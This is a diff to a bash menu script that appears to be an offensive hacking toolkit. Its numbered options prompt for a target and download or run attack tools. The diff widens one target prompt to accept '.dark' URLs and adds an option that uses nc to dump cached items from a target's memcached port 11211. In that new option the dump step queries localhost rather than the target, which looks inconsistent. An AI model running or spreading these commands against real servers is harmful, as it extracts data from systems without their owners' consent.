@@ -3351,7 +3351,7 @@ while true; do
 	;;
 	"628")
 		echo "Digit target IP or URL"
-		read -p "(example  192.168.168.12): " TIP
+		read -p "(example  192.168.168.12 or http://something.dark): " TIP
 		if [[ "$TIP" != "" ]];
 		then
 			echo "Digit target username"
@@ -3413,6 +3413,14 @@ while true; do
 	"637")
 		Scarica "$ENTRAW""Viralmaniar/Remote-Desktop-Caching-/master/remotecache.py"
 		Scarica "$ENTRAW""Viralmaniar/Remote-Desktop-Caching-/master""$RQRM"
+	;;
+	"638")
+		echo "Digit a target IP"
+		read -p "(example, 192.168.168.125): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo 'stats items' | nc "$TIP" 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
